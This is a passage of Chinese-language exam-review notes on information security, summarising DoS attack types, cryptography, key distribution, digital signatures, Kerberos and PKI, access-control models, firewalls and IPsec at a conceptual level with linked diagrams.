<p><strong>拒绝服务攻击</strong>（Denial of Service, DoS )通过堵塞网络、占用系统资源等方法，拒绝用户的服务访问，破坏系统的正常运行。   </p>
</blockquote>
<blockquote>
<p><strong>分布式拒绝服务攻击</strong>：借助于客户机&#x2F;服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DoS攻击，从而成倍地提高拒绝服务攻击的威力。     </p>
</blockquote>
<p>所谓僵尸网络，就是黑客利用僵尸程序控制大量互联网用户的计算机，这些计算机就像“僵尸”一样被黑客所操纵，随时按照黑客的指令展开DDoS攻击或发送垃圾信息，而真正的用户却毫不知情，就仿佛没有自主意识的僵尸一般。</p>
<blockquote>
<p><strong>攻击流程</strong>：情报收集（IP情况、主机配置）-占领傀儡机（漏洞入侵，留后门）-实际攻击（发送大量数据包）</p>
</blockquote>
<blockquote>
<p><strong>防御措施</strong>：发现漏洞；加强网络管理；利用网络设备如防火墙；应急策略</p>
</blockquote>
<p>以下是一些<strong>常见的DOS攻击方法</strong>：</p>
<ol>
<li><p><strong>IP碎片攻击</strong>:一种<strong>计算机程序重组</strong>的漏洞<br>数据链路层对于所传输的帧有一个长度限制，不允许超过最大传输单元MTU。数据部分大于这个值，就要进行分片（fragmentation）以满足在以太网中的传输要求。但是，数据被分片后，组成一个IP包的各分片都到达<strong>目的主机才进行重组</strong>。分片会导致<strong>传输效率降低</strong>。并且超大的包一旦出现，包当中的<strong>额外数据就会被写入其他正常区域</strong>，这很容易导致<strong>系统进入非稳定状态</strong>，是一种典型的缓存溢出攻击。</p>
</li>
<li><p><strong>泪滴攻击</strong>（teardrop）：发送<strong>含有重叠偏移的畸形数据分段</strong></p>
</li>
<li><p><strong>UDP“洪水</strong>”：<br>因为<strong>UDP是一种无连接</strong>的协议，它不需要用任何程序建立连接就可以传送数据。这样，攻击者只要开启一个端口提供相关的服务，就可以对攻击对象进行针对相关服务的攻击。常见的情况是利用<strong>大量UDP小包</strong>（程序），对DNS服务器、Radius认证服务器、流媒体服务器以及防火墙等发起攻击，<strong>造成网络瘫痪。</strong></p>
</li>
<li><p><strong>SYN“洪水”</strong>：利用TCP三次握手的缺陷<br>三次握手过程存在着漏洞：假设一个客户向服务器发送了SYN报文后突然死机或掉线，那么服务器在发出SYN+ACK应答报文后就无法收到客户端的ACK报文，使第三次握手无法完成。而服务器并不知道客户端发生了什么情况，于是就会重试，再次发送SYN+ACK给客户端，并等待一段时间——SYN Timeout（大约为30秒-2分钟）后丢弃这个半连接。<br>服务器端将为了维护一个非常大的半连接列表而消耗非常多的资源，即便是简单的保存并遍历也会消耗非常多的CPU时间和内存，何况还要不断对这个列表中的IP进行SYN+ACK的重试。这种情况下，若服务器的TCP&#x2F;IP栈不够强大，最后就会导致堆栈溢出使系统崩溃；即使服务器端的系统足够强大，服务器端也会因忙于处理攻击者伪造的TCP连接请求而无暇理睬客户的正常请求，使服务器无法再服务。 </p>
</li>
<li><p>Land也是利用<strong>三次握手的缺陷</strong>进行攻击。但它不是依靠伪造的地址，而是先发出一个特殊的SYN数据包，包中的<strong>源地址和目标地址都是目标主机</strong>。这样，就会让目标主机向自己回以SYN&#x2F;ACK包，导致<strong>自己又给自己回一个ACK</strong>并建立自己与自己的连接。大量这样的无效连接达到一定数量，将会拒绝新的连接请求。</p>
</li>
<li><p><strong>MAC Flood攻击</strong>：针对<strong>交换机</strong>的攻击<br>攻击者可以使用一个程序，伪造大量包含随机源MAC地址的数据帧发往交换机。由于有些攻击程序一分钟就可以发出十几万个伪造的MAC地址，而交换机一般<strong>MAC地址表</strong>就几千条，所以瞬间就会把交换机的<strong>MAC地址表</strong>填满。</p>
</li>
</ol>
<h2 id="第一章习题"><a href="#第一章习题" class="headerlink" title="第一章习题"></a>第一章习题</h2><h1 id="第二章：数据安全保护"><a href="#第二章：数据安全保护" class="headerlink" title="第二章：数据安全保护"></a>第二章：数据安全保护</h1><h2 id="机密性保护–密码学"><a href="#机密性保护–密码学" class="headerlink" title="机密性保护–密码学"></a>机密性保护–密码学</h2><blockquote>
<p><strong>复习建议：不会靠具体的算法实现，而是宏观上考。所以对于概念的理解记忆很重要。</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677726892851.png"></p>
<h3 id="数据加密体制"><a href="#数据加密体制" class="headerlink" title="数据加密体制"></a>数据加密体制</h3><blockquote>
<p><strong>公开密钥体制</strong>：非对称密钥，如RSA</p>
</blockquote>
<blockquote>
<p><strong>对称密钥体制</strong>：如DES、AES等</p>
</blockquote>
<blockquote>
<p><strong>分组密码</strong>：将一定长度的明文分成固定长度的<strong>分组进行加密</strong>，每个分组都独立地进行加密。</p>
</blockquote>
<blockquote>
<p><strong>流密码</strong>：流密码(stream cipher)也称<strong>序列密码</strong>，以<strong>一位或者一个字节</strong>为单位，使用密钥流的随机密钥对明文进行加密。</p>
</blockquote>
<p>在流密码技术中，如果<strong>密钥流完全独立于明文流或密文流</strong>，则称这种流密码为<strong>同步流密码</strong>（synchronous stream cipher）；如果<strong>密钥流的产生与明文流或密文流有关</strong>，则称这种流密码为<strong>自同步流密码</strong>（self-synchronous stream cipher）。 </p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677727243599.png"></p>
<h3 id="量子密码"><a href="#量子密码" class="headerlink" title="量子密码"></a>量子密码</h3><p>从理论上讲，应用量子通信技术加密的信息是绝对安全，<strong>不会被监听或截取</strong>的。量子通信所做的并不是加密，而是把<strong>密钥分配给需要加密通信的用户双方</strong>，密文的发送仍然可以通过标准的通信手段来完成。而这个过程要保证的就是能够在终端A、B两人之间实现密钥的分配，并且要保证分配过程中不会使未授权的第三方得到密钥的内容。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677727455658.png"><br><strong>量子密钥分发QKD</strong></p>
<h2 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h2><blockquote>
<p><strong>复习建议：理解密钥管理的4个方法流程</strong></p>
</blockquote>
<h3 id="密钥分配中心（KDC）分发单密钥"><a href="#密钥分配中心（KDC）分发单密钥" class="headerlink" title="密钥分配中心（KDC）分发单密钥"></a>密钥分配中心（KDC）分发单密钥</h3><p>其<strong>结构如下</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677727653268.png"><br><strong>KDC即密钥分配中心</strong>，用于响应用户请求分发密钥（是<strong>单密钥</strong>），其过程如下：</p>
<ol>
<li>A向KDC发出<strong>会话密钥请求</strong>：<code>IDA|| IDB||N1</code>；</li>
<li>KDC对A的请求应答：<code>EKA[Ks||IDB||N1||EKB[&#123;Ks||IDA&#125;]]</code>；</li>
<li>A存储Ks，并向B转发：<code>EKB[Ks||IDA]</code>。B得到：<br> Ks（还知道Ks来自KDC，因为只有KDC知道KB）；<br> IDA，并由此知道会话方是A；</li>
<li>B向A回送报文：<code>EKs[N2]</code>；</li>
<li>A向B回送报文：<code>EKs[f（N2）]</code>，确认B前次收到的报文不是回放。</li>
</ol>
<p><strong>分析</strong>：只有KDC知道AB密钥，所以分配给A的Ks需要使用Ka加密，以保证是KDC发出；而发送给B的是<code>Ekb[Ks||IDa]</code>，这样就保证B得到的密钥是A从DKC获取的。</p>
<p>其中<strong>N2为会话标识</strong>，防止报文回放。因为都是通过Ks加密的信息。</p>
<h3 id="无中心的单钥分配"><a href="#无中心的单钥分配" class="headerlink" title="无中心的单钥分配"></a>无中心的单钥分配</h3><p>其<strong>流程如下</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677728184197.png"></p>
<p><strong>没有KDC了</strong>，由B确定密钥，A只需要确定该秘钥是B发的即可：</p>
<ol>
<li>A向B会话请求：N1。<strong>N1标识本次会话</strong>（可能是<strong>时间戳或随机数</strong>等一个他人难于猜测的现时值）；</li>
<li>B对A的请求应答：<code>EMk [Ks||IDB||f(N1&#125;|| N2]]</code></li>
<li>全部报文用A、B共享的主密钥Km加密：<br>  B选取的会话密钥<strong>Ks</strong>；<br>  A的请求报文（包括f(N1}，供A检验）；<br>  B的身份<strong>IDb</strong>；<br>  标识本次会话的<strong>N2</strong>；</li>
<li>A存储Ks，并向B返回用Ks加密f(N2}，供B检验。</li>
</ol>
<p><strong>分析</strong>：使用N1、N2实现会话的认证.与上方法相比，少了KDC。</p>
<h3 id="由公钥管理机构分发公钥"><a href="#由公钥管理机构分发公钥" class="headerlink" title="由公钥管理机构分发公钥"></a>由公钥管理机构分发公钥</h3><p>其<strong>流程如下</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677728494430.png"></p>
<p>这里<strong>分配的是公钥</strong>，由公钥管理机构分别发给A和B：</p>
<ol>
<li>用户A向公钥管理机构<strong>发出请求报文</strong>：请求获取<strong>B的公钥</strong>；</li>
<li>公钥管理机构对A应答PKB（<strong>用A的公钥加密，A用自己的私钥解密</strong>）；</li>
<li>B用同1、2相同的方法，从公钥管理机构得到<strong>A的公钥PKA</strong>；</li>
<li>A用PKB向B发送一个报文：包含<strong>随机标识号N1</strong>；</li>
<li>B用PKA向A发送一个报文：包含与<strong>N1</strong>以及B的随机标识号<strong>N2</strong>；</li>
<li>A用PKB将N2加密，返回B，<strong>供B确认</strong>。</li>
</ol>
<p><strong>分析</strong>：与前一致，在A、B获取到密钥后都要通过<strong>三次交互</strong>来进行验证。只是前面的是分配单密钥，这里是公钥，要使用对方公钥加密。</p>
<p><strong>注</strong>：公钥管理机构、KDC等都<strong>没有自己的私钥和公钥</strong>，都是使用用户的密钥。</p>
<h3 id="公钥证书"><a href="#公钥证书" class="headerlink" title="公钥证书"></a>公钥证书</h3><p>公钥证书是由<code>CA（Certificate Authority，证书授权中心或认证中心）</code>为用户发布的一种电子证书。例如用户A的证书内容形式为：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">CA</span>=ESKCA[T，IDA，PKA]</span><br></pre></td></tr></table></figure>

<ul>
<li>IDA是用户A的标识。</li>
<li>PKA是A的公钥。</li>
<li>T是<strong>当前时间戳</strong>，用于表明证书的新鲜性，防止发送方或攻击者重放一旧证书。</li>
<li>SKCA是<strong>CA的私钥</strong>。证书是用CA的私钥加密的，以便让任何用户都可以解密，并确认证书的颁发者。</li>
</ul>
<p><strong>分析</strong>：使用数字证书分发公钥，<strong>不需要通信双方进行验证</strong>，因此CA由公信力。</p>
<h2 id="完整性保护–消息认证"><a href="#完整性保护–消息认证" class="headerlink" title="完整性保护–消息认证"></a>完整性保护–消息认证</h2><blockquote>
<p><strong>复习建议：这里MAC和哈希是重点，但是也是在概念上，不会涉及具体算法。</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677729012094.png"></p>
<h3 id="MAC函数"><a href="#MAC函数" class="headerlink" title="MAC函数"></a>MAC函数</h3><blockquote>
<p><strong>MAC函数的特点</strong>：（与一般加密的不同）</p>
</blockquote>
<ul>
<li>加密算法要求可逆性，而MAC算法<strong>不要求可逆性</strong>；</li>
<li>加密函数明文长度与密文长度一般相同，是一对一的函数，而MAC函数则是<strong>多对一的函数</strong>。</li>
<li>MAC函数比加密函数<strong>更不容易攻破</strong>，因为即便攻破，也无法验证其正确性。</li>
</ul>
<blockquote>
<p><strong>CBC-MAC</strong>（链式结构）：大体看下，基于DES</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677729208660.png"></p>
<h3 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h3><p>杂凑函数，也称<strong>hash函数、散列函数</strong>，它可以提供判断电子信息完整性的依据，是防止信息被篡改的一种有效方法。</p>
<blockquote>
<p>几个性质：特别是碰撞性</p>
</blockquote>
<ul>
<li>H的输入可以是任意长，而<strong>输出是固定长</strong>；</li>
<li>输入的微小变化会引起输出产生巨大变化，因此改变原始报文中的任意一位的值，将产生完全不同的杂凑码</li>
<li><strong>单向性</strong>，正向计算H(M)很容易，但对于给定的杂凑码H(M) ，几乎无法找到M’使H(M’)&#x3D; H(M) 。（<strong>弱抗碰撞性</strong>）</li>
<li>找到任意满足H(M)&#x3D; H(M’) 且M≠M’的报文对(M, M’)也是几乎不可能的。（<strong>强抗碰撞性</strong>）</li>
<li>H函数的算法是公开的，杂凑码的安全性来自<strong>H产生单向杂凑</strong>的能力。</li>
</ul>
<blockquote>
<p><strong>几个例子</strong>：MD5\SHA1</p>
</blockquote>
<h3 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677736437432.png"></p>
<h2 id="不可否认性保护–数字签名"><a href="#不可否认性保护–数字签名" class="headerlink" title="不可否认性保护–数字签名"></a>不可否认性保护–数字签名</h2><blockquote>
<p><strong>复习建议：重点部分，了解两种数字签名的方式及实例。</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677729520874.png"></p>
<h3 id="直接数字签名"><a href="#直接数字签名" class="headerlink" title="直接数字签名"></a>直接数字签名</h3><blockquote>
<p>所谓直接方式，就是<strong>签名过程只与发送和接收参与</strong>。实施这种方法的前提是接收方可以通过某种方式验证发送方提交的凭证，也可以在发生争议时将该凭证交第三方仲裁。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677730983906.png"></p>
<p><strong>DSA实例</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677730809985.png"><br><strong>分析</strong>：使用SHA生成摘要进行签名可以加快效率；使用发送方私钥进行签名公钥进行验证。</p>
<h3 id="有仲裁的数字签名"><a href="#有仲裁的数字签名" class="headerlink" title="有仲裁的数字签名"></a>有仲裁的数字签名</h3><blockquote>
<p>发送方完成签字后，不是直接发送给接收方，而是将报文和签字先发送给<strong>双方共同信任的第三方</strong>进行验证，第三方验证无误后，再附加一个“<strong>已经通过验证</strong>”的说明并注上日期，一同发送给接收方。由于第三方的介入，<strong>发方和接收方都无法抵赖</strong></p>
</blockquote>
<p>根据对第三方的信任程度，又可以分为以下三种方法：</p>
<p>其中：<strong>T是时间戳、ID是身份标识、H是哈希，XY为通信双方、A是认证机构、M是报文</strong>、。</p>
<blockquote>
<p>方法1：对称密钥方式</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677729830650.png"></p>
<p><strong>分析</strong>：该方法建立在X和Y对A的<strong>高度信任基础</strong>上，同时没有对仲裁者进行约束（使用AX的共享密钥进行签名）；同时<strong>不提供保密性</strong>。</p>
<blockquote>
<p>方案2：对称密钥明文加密</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677729906390.png"><br><strong>分析</strong>：该方法使用密钥加密了M，<strong>提供了保密性（即仲裁者无法获取M)<strong>；但是</strong>没有解决对仲裁者的约束(还是使用Eax签名）</strong>。</p>
<blockquote>
<p>方案3：公开密钥密文加密</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677729937111.png"><br><strong>分析</strong>：该方法在2的基础上解决了对仲裁方的约束。这种方法下A只能保证报文是X发送的，由Y进行签名的验证。</p>
<h2 id="SET实例"><a href="#SET实例" class="headerlink" title="SET实例"></a>SET实例</h2><blockquote>
<p><strong>主要掌握数字信封和双重签名</strong></p>
</blockquote>
<h3 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677731139172.png"></p>
<h3 id="双重签名"><a href="#双重签名" class="headerlink" title="双重签名"></a>双重签名</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677731161799.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677731288772.jpg"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677731318475.jpg"><br><strong>练习题</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677736404227.png"></p>
<h1 id="第三章：身份认证与访问控制"><a href="#第三章：身份认证与访问控制" class="headerlink" title="第三章：身份认证与访问控制"></a>第三章：身份认证与访问控制</h1><blockquote>
<p><strong>身份认证的流程与前面的密钥管理的流程类似，但是在此基础上进行了扩展，增加了身份的认证环节。</strong></p>
</blockquote>
<h2 id="基于密钥分发的身份认证"><a href="#基于密钥分发的身份认证" class="headerlink" title="基于密钥分发的身份认证"></a>基于密钥分发的身份认证</h2><blockquote>
<p><strong>复习建议：掌握公钥加密认证和单钥加密认证，每一个都有两种类型：单向、双向</strong></p>
</blockquote>
<h3 id="公钥加密认证协议"><a href="#公钥加密认证协议" class="headerlink" title="公钥加密认证协议"></a>公钥加密认证协议</h3><blockquote>
<p>基于公钥加密认证体制<strong>分配会话密钥</strong>的过程实现的。</p>
</blockquote>
<blockquote>
<p>相互认证协议</p>
</blockquote>
<p><strong>具体流程如下</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677731751690.png"></p>
<blockquote>
<p>单向认证</p>
</blockquote>
<p>其<strong>流程如下</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677731917366.png"></p>
<h3 id="单钥加密认证协议"><a href="#单钥加密认证协议" class="headerlink" title="单钥加密认证协议"></a>单钥加密认证协议</h3><blockquote>
<p><strong>相互认证协议：N-S</strong>（关键知识点）</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677732098664.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677732204353.png"></p>
<p><strong>分析</strong>：这里的认证方法与前密钥管理时第一种方法一致，只是增加了时间戳，更加完善。</p>
<blockquote>
<p>单向认证协议</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677732264832.png"></p>
<h3 id="Kerberos认证系统：认证、计费、审计"><a href="#Kerberos认证系统：认证、计费、审计" class="headerlink" title="Kerberos认证系统：认证、计费、审计"></a>Kerberos认证系统：认证、计费、审计</h3><blockquote>
<p>基本原理</p>
</blockquote>
<p>通过使用对称密钥系统为客户机&#x2F;服务器应用程序提供强大的第三方认证服务。</p>
<ul>
<li>每个用户或应用服务器与Kerberos<strong>分享一个对称密钥</strong>。</li>
<li>允许一个用户通过交换加密消息在整个网络上与另一个用户或应用服务器<strong>互相证明身份</strong>，Kerberos给通讯双方提供对称密钥。</li>
<li><strong>客户端用票据Ticket证明自己身份</strong>。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677736977670.png"></p>
<blockquote>
<p>同域认证：三阶段六步骤</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677736817271.jpg"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677736827635.jpg"></p>
<blockquote>
<p>异域认证：7步</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677736613589.png"></p>
<h2 id="基于数字证书的身份认证"><a href="#基于数字证书的身份认证" class="headerlink" title="基于数字证书的身份认证"></a>基于数字证书的身份认证</h2><blockquote>
<p><strong>复习建议：X509掌握，PKI基本概念</strong></p>
</blockquote>
<h3 id="X-509证书标准"><a href="#X-509证书标准" class="headerlink" title="X.509证书标准"></a>X.509证书标准</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677732506771.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677732528761.png"></p>
<p><strong>那个练习题：</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677732673967.png"></p>
<h3 id="PKI介绍"><a href="#PKI介绍" class="headerlink" title="PKI介绍"></a>PKI介绍</h3><p>PKI是一种遵循一定标准的密钥管理基础平台，为所有网络应用提供加密和数字签名等密码服务所必需的密钥和证书管理。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677732791319.png"></p>
<h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><blockquote>
<p><strong>复习建议：掌握基本概念与练习题</strong></p>
</blockquote>
<h3 id="基本理论"><a href="#基本理论" class="headerlink" title="基本理论"></a>基本理论</h3><blockquote>
<p><strong>自主访问控制</strong>：</p>
</blockquote>
<p><strong>资源的所有者可以对资源的访问进行控制</strong>，任意规定谁可以访问其资源，自主地直接或间接地将权限传给（分发给）主体。<br>通过访问控制矩阵来限定主体针对客体可以执行的操作类型。</p>
<ul>
<li><strong>优点</strong>：应用<strong>灵活与可扩展性</strong>，经常被用于商业系统。</li>
<li><strong>缺点</strong>：权限传递很容易造成漏洞，<strong>安全级别比较低</strong>，不太适合网络环境，主要<strong>用于单个主机</strong>上。</li>
</ul>
<blockquote>
<p>强制访问控制：</p>
</blockquote>
<p>系统事先给访问主体和受控客体分配不同的<strong>安全级别属性</strong>。<br>在实施访问控制时，系统先对访问主体和受控客体的安全级别属性<strong>进行比较</strong>，再决定访问主体能否访问该受控客体。</p>
<ul>
<li><strong>优点</strong>：具有<strong>高度的安全性</strong>和精确的控制，可以避免用户错误地授权给不恰当的人。</li>
<li><strong>缺点</strong>：相对于自主访问控制，强制访问控制的<strong>灵活性和可扩展性较低</strong>，因为它是由系统管理员根据安全需求来限制访问控制的。</li>
</ul>
<blockquote>
<p><strong>下读上写 与下读上写</strong></p>
</blockquote>
<ul>
<li>下读：用户级别高于信息级别的读操作</li>
<li>上读：用户级别低于信息级别的读操作</li>
<li>下写：用户级别高于信息级别的写操作</li>
<li>上写：用户级别低于信息级别的写操作</li>
</ul>
<p><strong>其中</strong>：</p>
<ul>
<li>上读下写 &#x3D;&#x3D; 保证数据完整性</li>
<li>下读上写 &#x3D;&#x3D; 保证数据机密性</li>
</ul>
<blockquote>
<p><strong>基于角色的访问控制</strong>：明确区分权限与职责，使得二者相互制约。</p>
</blockquote>
<p>角色Role的概念：一个Role是一个<strong>与特定工作活动相关联的行为与责任的集合</strong></p>
<p>当将<strong>一个角色与一个组</strong>绑定，则这个组就拥有了该角色拥有的特定工作的行为能力和责任。</p>
<p>组Group和用户User都可以看成是<strong>角色分配的单位和载体</strong>。</p>
<p><strong>基本思想</strong>是将访问权限分配给一定的角色，用户通过饰演不同的角色获得角色所拥有的访问许可权。</p>
<h3 id="一道练习题"><a href="#一道练习题" class="headerlink" title="一道练习题"></a>一道练习题</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677733123707.png"></p>
<p><strong>注</strong>：这里答案少了一个图。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677733251416.png"></p>
<h1 id="第四周：数据安全防护"><a href="#第四周：数据安全防护" class="headerlink" title="第四周：数据安全防护"></a>第四周：数据安全防护</h1><blockquote>
<p><strong>复习建议：防火墙的四大安全技术、IPsec与SSL、入侵检测系统相关概念</strong></p>
</blockquote>
<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><h3 id="用自己的话简述4大技术"><a href="#用自己的话简述4大技术" class="headerlink" title="用自己的话简述4大技术"></a>用自己的话简述4大技术</h3><blockquote>
<p><strong>包过滤技术</strong>通过设置一定的包过滤规则，以此控制数据包的允许与拒绝，达到安全防护的目的。</p>
</blockquote>
<p>只是对<strong>单个数据包</strong>的源地址、目标地址、TCP&#x2F;UDP源端口号、TCP&#x2F;UDP目的端口号、标志位、协议以及内容等进行检测。</p>
<blockquote>
<p><strong>代理服务技术</strong>：代理服务器位于客户与Internet上的服务器之间。请求由客户端向服务器发起，但是这个请求要首先被送到代理服务器。</p>
</blockquote>
<ul>
<li><strong>应用级代理</strong>只有为特定的应用程序安装了代理程序代码，该服务是才会被支持，并建立相应的连接。</li>
<li><strong>电路级代理</strong>也称电路级网关。在OSI模型中电路级网观工作在会话层，进行会话层的过滤。</li>
</ul>
<blockquote>
<p><strong>状态检测技术</strong>是包过滤技术的延伸，结合了<strong>包过滤防火墙</strong>、<strong>应用代理防火墙</strong>的特点，作用于<strong>网络层、传输层和应用层</strong>。</p>
</blockquote>
<ul>
<li>与包过滤防火墙一样能够在<strong>网络层和传输层</strong>上对通过数据包进行<strong>IP地址和端口的过滤</strong>；</li>
<li>与应用代理防火墙一样<strong>检查应用层上数据的内容</strong>是否符合安全规则。</li>
</ul>
<p><strong>分析</strong>：包过滤防火墙使用规则表，状态检查防火墙使用规则表和状态表。</p>
<h3 id="未来趋势"><a href="#未来趋势" class="headerlink" title="未来趋势"></a>未来趋势</h3><h2 id="安全协议分析"><a href="#安全协议分析" class="headerlink" title="安全协议分析"></a>安全协议分析</h2><h3 id="IPsec"><a href="#IPsec" class="headerlink" title="IPsec"></a>IPsec</h3><blockquote>
<p><strong>协议介绍</strong>：是一套<strong>协议包</strong>，集成的多种安全技术(工作在IP层，是对IP协议的补充)</p>
</blockquote>
<ul>
<li>IPSec（Internet Protocol Security）：IP安全协议标准 </li>
<li>IPSec的功能：认证（Authentication）和保密（Confidentiality）。</li>
<li>使用IPSec可以防范几种网络攻击：Sniffer、数据篡改、身份欺骗、重放攻击、拒绝服务攻击。</li>
</ul>
<blockquote>
<p><strong>两种模式</strong>：传输模式与隧道模式</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677734609618.png"><br><strong>传输模式的特点</strong>是：</p>
<ul>
<li>只保护数据，<strong>不保护IP头</strong>——IP地址是暴露的。</li>
<li>用于<strong>两个主机</strong>之间。</li>
</ul>
<p><strong>隧道模式的特点</strong>是：</p>
<ul>
<li>既保护数据，<strong>又保护IP头</strong>。</li>
<li>用于<strong>两个安全网关</strong>之间。</li>
<li>无法控制来自内部的攻击</li>
</ul>
<blockquote>
<p><strong>基本协议</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677734948561.png"></p>
<ul>
<li><strong>ESP协议</strong>：<ul>
<li>对IP数据报文<strong>实施加密</strong>和可选认证双重服务，提供了数据保密性、有限的数据流保密性、数据源认证、无连接的完整性以及抗重放攻击等服务。</li>
</ul>
</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677734891082.png"></p>
<ul>
<li><strong>AH协议</strong>：<ul>
<li>对IP数据报文实施<strong>认证服务</strong>，提供数据源认证、无连接的完整性以及一个可选的抗重放服务。</li>
</ul>
</li>
<li>AH协议和ESP协议都支持认证功能，但二者的<strong>保护范围</strong>存在着一定的差异：</li>
<li>AH的作用域是<strong>整个IP数据包</strong>，包括IP头和承载数据；</li>
<li>ESP认证功能的作用域只是<strong>承载数据</strong>，不包括IP头</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677734913971.png"></p>
<blockquote>
<p><strong>Internet密钥交换协议</strong>:IKE</p>
</blockquote>
<p>（1）安全关联（（security associations，SA））的集中化管理，以减少连接时间。<br>（2）密钥的生成与管理。<br>IKE规定了验证IPSec对等实体、协商安全服务和生成会话密钥的方法。IKE将密钥协商结果保留在SA中，供AH和ESP以后通信时使用。</p>
